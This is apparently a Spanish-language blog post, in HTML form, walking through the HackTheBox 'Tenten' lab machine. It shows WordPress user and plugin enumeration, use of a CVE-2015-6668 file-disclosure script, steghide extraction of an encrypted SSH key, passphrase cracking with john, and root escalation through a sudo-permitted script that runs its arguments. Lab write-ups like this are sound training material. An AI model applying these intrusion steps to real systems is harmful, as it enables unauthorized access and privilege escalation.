@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Tenten (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Tenten (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-02T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Tenten (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-11-02T00:00:00-06:00","datePublished":"2024-11-02T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Tenten (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/11/02/tenten.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Tenten (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-11-02T00:00:00-06:00" itemprop="datePublished">
+        Nov 2, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/e58a465e93364c423cd2162945f8f7bf.png" />
+</p>
+
+<ul>
+  <li>Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.10 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-11-02 18:57 CST
+Nmap scan report <span class="k">for </span>10.10.10.10
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://tenten.htb/
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: Host: 127.0.1.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Tenemos un subdominio vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.10 tenten.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.10.10 tenten.htb
+</code></pre></div></div>
+
+<ul>
+  <li>También lo pudimos haber visto de esta forma.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-I</span> http://10.10.10.10
+HTTP/1.1 301 Moved Permanently
+Date: Sun, 03 Nov 2024 00:59:56 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Location: http://tenten.htb/
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos un <code class="language-plaintext highlighter-rouge">WordPress</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/1.png" />
+</p>
+
+<ul>
+  <li>Es un <code class="language-plaintext highlighter-rouge">WordPress</code> de versión <code class="language-plaintext highlighter-rouge">4.7.3</code>.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">tenten</span><span class="p">.</span><span class="nf">htb</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">tenten</span><span class="p">.</span><span class="nf">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">18</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">18</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">4</span><span class="p">],</span> <span class="no">MetaGenerator</span><span class="p">[</span><span class="no">WordPress</span> <span class="mf">4.7</span><span class="o">.</span><span class="mi">3</span><span class="p">],</span> <span class="no">PoweredBy</span><span class="p">[</span><span class="no">WordPress</span><span class="p">,</span><span class="no">WordPress</span><span class="p">,],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Job</span> <span class="no">Portal</span> <span class="o">&amp;</span><span class="c1">#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Comenzamos enumerando usuarios <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration</a> siguiente instrucciones vemos que si lanzamos una petición al <code class="language-plaintext highlighter-rouge">id</code> <code class="language-plaintext highlighter-rouge">1</code> nos responde con un <code class="language-plaintext highlighter-rouge">301</code> pero nos da el nombre de un usuario llamado <code class="language-plaintext highlighter-rouge">takis</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-I</span> <span class="nt">-X</span> GET <span class="s1">'http://tenten.htb/?author=1'</span>
+HTTP/1.1 301 Moved Permanently
+Date: Sun, 03 Nov 2024 01:05:04 GMT
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Location: http://tenten.htb/index.php/author/takis/
+Content-Length: 0
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code> para escanear el <code class="language-plaintext highlighter-rouge">Wordpress</code> y encontrar ya sea <code class="language-plaintext highlighter-rouge">themes</code>, <code class="language-plaintext highlighter-rouge">plugins</code> y mas usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wpscan <span class="nt">--url</span> http://10.10.10.10 <span class="nt">-e</span> ap,t,tt,u
+</code></pre></div></div>
+
+<ul>
+  <li>Encontramos un Plugin.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>i] Plugin<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] job-manager
+ | Location: http://tenten.htb/wp-content/plugins/job-manager/
+ | Latest Version: 0.7.25 <span class="o">(</span>up to <span class="nb">date</span><span class="o">)</span>
+ | Last Updated: 2015-08-25T22:44:00.000Z
+ |
+ | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 7.2.5 <span class="o">(</span>80% confidence<span class="o">)</span>
+ | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt
+</code></pre></div></div>
+
+<ul>
+  <li>Encontramos el <code class="language-plaintext highlighter-rouge">theme</code> en uso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentyseventeen
+ | Location: http://tenten.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-07-16T00:00:00.000Z
+ | Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 3.7
+ | Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver<span class="o">=</span>4.7.3
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
+ | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver<span class="o">=</span>4.7.3, Match: <span class="s1">'Version: 1.1'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Si buscamos en internet tiene vulnerabilidades <a href="https://github.com/jimdiroffii/CVE-2015-6668">https://github.com/jimdiroffii/CVE-2015-6668</a>.</p>
+  </li>
+  <li>
+    <p>El Plugin <code class="language-plaintext highlighter-rouge">WP Job Manager</code> es popular en <code class="language-plaintext highlighter-rouge">WordPress</code> ya que se utiliza para gestionar ofertas de empleo en sitios web.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/2.png" />
+</p>
+
+<ul>
+  <li>Si le damos en <code class="language-plaintext highlighter-rouge">Apply Now</code> nos pide datos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/3.png" />
+</p>
+
+<ul>
+  <li>Basándonos en el GitHub vamos a iterar el numero para ver la respuesta que obtenemos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/4.png" />
+</p>
+
+<ul>
+  <li>Si vamos a la petición 13 vemos que obtenemos un nombre raro en el <code class="language-plaintext highlighter-rouge">Job Application</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/5.png" />
+</p>
+
+<ul>
+  <li>Básicamente en esa parte se suben <code class="language-plaintext highlighter-rouge">CV</code> y si usamos el script y le pasamos el nombre del <code class="language-plaintext highlighter-rouge">Title</code> vemos que nos reporta esto, esta vulnerabilidad nos permite filtrar títulos de publicaciones en la base de datos incluyendo cosas privadas es por eso que nos reporte una imagen.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 exploit.py
+
+CVE-2015-6668
+Title: CV filename disclosure on Job-Manager WP Plugin
+Author: Evangelos Mourikis
+Blog: https://vagmour.eu
+Plugin URL: http://www.wp-jobmanager.com
+Versions: &lt;<span class="o">=</span>0.7.25
+
+Enter a vulnerable website: http://tenten.htb 
+Enter a file name: HackerAccessGranted
+<span class="o">[</span>+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la imagen.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/6.png" />
+</p>
+
+<ul>
+  <li>Vamos a guardarla.</li>
+</ul>
+
+<h2 id="shell-as-takis">Shell as takis</h2>
+
+<ul>
+  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">steghide</code> podemos ver información oculta si la usamos podemos observar que nos dicen sobre una <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide info HackerAccessGranted.jpg
+<span class="s2">"HackerAccessGranted.jpg"</span>:
+  format: jpeg
+  capacity: 15.2 KB
+Try to get information about embedded data ? <span class="o">(</span>y/n<span class="o">)</span> y
+Enter passphrase: 
+  embedded file <span class="s2">"id_rsa"</span>:
+    size: 1.7 KB
+    encrypted: rijndael-128, cbc
+    compressed: <span class="nb">yes</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos extraerla.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide extract <span class="nt">-sf</span>  HackerAccessGranted.jpg
+Enter passphrase: 
+wrote extracted data to <span class="s2">"id_rsa"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>La tenemos pero encriptada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
+
+/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
+tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
+1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
+K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
+SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
+WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
+VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
+J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
+AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
+2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
+6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
+pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
+tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
+KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
+4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
+2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
+L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
+VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
+5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
+Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
+p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
+yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
+9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
+vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
+YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> <span class="nb">hash</span>
+❯ john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+superpassword    <span class="o">(</span>id_rsa<span class="o">)</span>     
+1g 0:00:00:01 DONE <span class="o">(</span>2024-11-02 20:06<span class="o">)</span> 0.7462g/s 582113p/s 582113c/s 582113C/s superpene..supermoy
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Vamos a conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">chmod </span>600 id_rsa
+                                                                                                
+❯ ssh <span class="nt">-i</span> id_rsa takis@10.10.10.10
+The authenticity of host <span class="s1">'10.10.10.10 (10.10.10.10)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:5a3db7g5K/KVQU7u9yholvmJI7kp3pWZj0qtGz4Yr9Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.10<span class="s1">' (ED25519) to the list of known hosts.
+Enter passphrase for key '</span>id_rsa<span class="s1">': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+39 updates are security updates.
+
+
+Last login: Fri May  5 23:05:36 2017
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+takis@tenten:~$ export TERM=xterm
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+2147f10efc4677c6e852f9a0b765e848
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>
+    <p>Podemos ejecutar sin proporcionar contraseña <code class="language-plaintext highlighter-rouge">/bin/fuckin</code> como root.</p>
+  </li>
+  <li>
+    <p>Este es su contenido.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span>file /bin/fuckin
+/bin/fuckin: Bourne-Again shell script, ASCII text executable
+takis@tenten:~<span class="nv">$ </span><span class="nb">cat</span> /bin/fuckin
+<span class="c">#!/bin/bash</span>
+<span class="nv">$1</span> <span class="nv">$2</span> <span class="nv">$3</span> <span class="nv">$4</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si le concatenamos un comando lo ejecuta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/fuckin <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<ul>
+  <li>Vamos a ejecutar una bash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takis@tenten:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/fuckin /bin/bash
+root@tenten:~# <span class="nb">whoami
+</span>root
+root@tenten:~# <span class="nb">cat</span> /root/root.txt 
+d2fbb02fd8fa5e734ecbc1ca8cedf07e
+root@tenten:~# 
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/11/02/tenten.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
